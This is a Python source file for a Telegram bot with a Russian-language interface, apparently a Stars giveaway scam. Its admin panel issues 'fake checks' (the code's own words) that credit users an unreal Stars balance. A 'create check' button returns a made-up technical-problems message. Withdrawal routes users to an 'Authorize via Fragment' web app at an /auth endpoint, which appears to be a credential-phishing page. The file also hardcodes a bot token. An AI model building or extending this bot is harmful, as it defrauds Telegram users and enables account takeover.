import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BotCommand
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import json

TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
ADMIN_ID = 8503291981
RECEIVER_USERNAME = "@Defbymorgenshtern"
BOT_USERNAME = "@Givestarbots_bot"

RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "")
if not RENDER_URL:
    RENDER_URL = f"https://{os.getenv('RENDER_SERVICE_NAME', 'app')}.onrender.com"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

CHECKS_FILE = "checks.json"
USERS_FILE = "users.json"

# Подарки с ценами
GIFTS = {
    "🧸 Мишка": 10,
    "🌹 Роза": 20,
    "💐 Букет": 40,
    "🎂 Торт": 40,
    "🚀 Ракета": 40,
    "🏆 Кубок": 80,
    "💍 Кольцо": 80,
    "💎 Алмаз": 85,
    "🍾 Шампанское": 40
}

def load_checks():
    if os.path.exists(CHECKS_FILE):
        with open(CHECKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_checks(checks):
    with open(CHECKS_FILE, "w") as f:
        json.dump(checks, f)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f)

class AdminStates(StatesGroup):
    waiting_for_amount = State()

# Команды для меню
async def set_commands():
    commands = [
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="menu", description="Главное меню"),
        BotCommand(command="admin", description="Админ-панель"),
        BotCommand(command="checks", description="Список чеков"),
    ]
    await bot.set_my_commands(commands)

# Главное меню (клавиатура снизу)
def main_keyboard():
    kb = types.ReplyKeyboardMarkup(
        keyboard=[
            [types.KeyboardButton(text="👤 Профиль"), types.KeyboardButton(text="💰 Баланс")],
            [types.KeyboardButton(text="🎁 Купить подарки"), types.KeyboardButton(text="⭐ Создать чек на звёзды")]
        ],
        resize_keyboard=True
    )
    return kb

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("⚙️ Админ-панель готова.\n/admin — создать чек\n/checks — список чеков", reply_markup=main_keyboard())
    else:
        await message.answer("Добро пожаловать! Используйте меню для навигации.", reply_markup=main_keyboard())

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    await message.answer("⭐ Главное меню\nВыберите действие:", reply_markup=main_keyboard())

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("💰 Введите сумму звёзд для фейкового чека:")
    await state.set_state(AdminStates.waiting_for_amount)

@dp.message(AdminStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        amount = int(message.text)
        check_id = f"check_{message.date.timestamp()}"
        
        checks = load_checks()
        checks[check_id] = {
            "amount": amount,
            "created_by": ADMIN_ID,
            "created_at": str(message.date)
        }
        save_checks(checks)
        
        # Кнопка с ссылкой на бота
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"⭐ Получить {amount} звёзд", url=f"https://t.me/{BOT_USERNAME}?start={check_id}")]
        ])
        
        await message.answer(
            f"💎 Чек на {amount} ⭐ создан!\n🆔 {check_id}",
            reply_markup=kb
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число!")

# Обработка перехода по ссылке с check_id
@dp.message(F.text.startswith("/start check_"))
async def start_check(message: types.Message):
    check_id = message.text.replace("/start ", "")
    checks = load_checks()
    
    if check_id in checks:
        amount = checks[check_id]["amount"]
        await message.answer(
            f"✅ *Начислено {amount} звёзд!*\n\n"
            f"Откройте профиль чтобы посмотреть информацию и вывести их.",
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )
        
        # Сохраняем юзеру баланс
        users = load_users()
        user_id = str(message.from_user.id)
        if user_id not in users:
            users[user_id] = {
                "balance": 0,
                "checks_created": 0,
                "stars_spent": 0,
                "username": message.from_user.username or "нет",
                "first_name": message.from_user.first_name or "нет"
            }
        users[user_id]["balance"] += amount
        save_users(users)
    else:
        await message.answer("Чек не найден.", reply_markup=main_keyboard())

@dp.message(Command("checks"))
async def cmd_checks(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    checks = load_checks()
    if not checks:
        await message.answer("📭 Нет созданных чеков.")
        return
    text = "📋 Список чеков:\n\n"
    for cid, data in checks.items():
        text += f"🆔 {cid}\n💎 {data['amount']} ⭐\n📅 {data['created_at']}\n\n"
    await message.answer(text)

# Кнопка "👤 Профиль"
@dp.message(F.text == "👤 Профиль")
async def profile(message: types.Message):
    users = load_users()
    user_id = str(message.from_user.id)
    
    if user_id not in users:
        users[user_id] = {
            "balance": 0,
            "checks_created": 0,
            "stars_spent": 0,
            "username": message.from_user.username or "нет",
            "first_name": message.from_user.first_name or "нет"
        }
        save_users(users)
    
    u = users[user_id]
    text = (
        f"👤 *Профиль*\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"👤 Имя: {u['first_name']}\n"
        f"📛 Юзернейм: @{u['username']}\n"
        f"💎 Баланс: {u['balance']} ⭐\n"
        f"📦 Создано чеков: {u['checks_created']}\n"
        f"💸 Потрачено звёзд: {u['stars_spent']} ⭐"
    )
    await message.answer(text, parse_mode="Markdown")

# Кнопка "💰 Баланс"
@dp.message(F.text == "💰 Баланс")
async def balance(message: types.Message):
    users = load_users()
    user_id = str(message.from_user.id)
    
    if user_id in users:
        bal = users[user_id]["balance"]
    else:
        bal = 0
    
    await message.answer(f"💰 Ваш баланс: {bal} ⭐")

# Кнопка "⭐ Создать чек на звёзды"
@dp.message(F.text == "⭐ Создать чек на звёзды")
async def create_check_button(message: types.Message):
    await message.answer(
        "⚠️ *Технические проблемы*\n\n"
        "Сейчас у сервера технические проблемы, мы попробуем решить их как можно быстрее. "
        "Пожалуйста, попробуйте позже.",
        parse_mode="Markdown"
    )

# Кнопка "🎁 Купить подарки"
@dp.message(F.text == "🎁 Купить подарки")
async def gifts_shop(message: types.Message):
    text = "🎁 *Магазин подарков*\n\n"
    for name, price in GIFTS.items():
        text += f"{name} — {price} ⭐\n"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести звёзды", callback_data="withdraw_request")]
    ])
    
    await message.answer(text, parse_mode="Markdown", reply_markup=kb)

@dp.callback_query(F.data == "withdraw_request")
async def withdraw_request(callback: types.CallbackQuery):
    webapp_url = f"{RENDER_URL}/auth"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Авторизоваться через Fragment", web_app=WebAppInfo(url=webapp_url))]
    ])
    await callback.message.answer(
        "⚠️ Для вывода звёзд необходима авторизация через Fragment.\n\n"
        "Это безопасный способ подтвердить владение аккаунтом.",
        reply_markup=kb
    )
    await callback.answer()

async def main():
    await set_commands()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
